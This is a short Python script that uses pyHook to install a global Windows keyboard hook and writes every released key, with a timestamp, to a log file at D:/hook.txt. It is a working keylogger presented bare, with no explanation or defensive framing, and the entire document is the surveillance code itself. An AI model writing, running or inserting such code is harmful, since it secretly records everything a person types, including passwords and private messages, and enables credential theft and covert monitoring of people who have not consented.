import logging 
import pyHook,pythoncom,sys
import time
def OnKeyboardEved(event) :
  logging.basicConfig(filename='D:/hook.txt',format='%(asctime)-5s %(message)s',level=logging.DEBUG)
  chr(event.Ascii)
  logging.log(10,chr(event.Ascii))
  return True 
hooks_manager = pyHook.HookManager()
hooks_manager.KeyUp=OnKeyboardEved
hooks_manager.HookKeyboard()

pythoncom.PumpMessages()
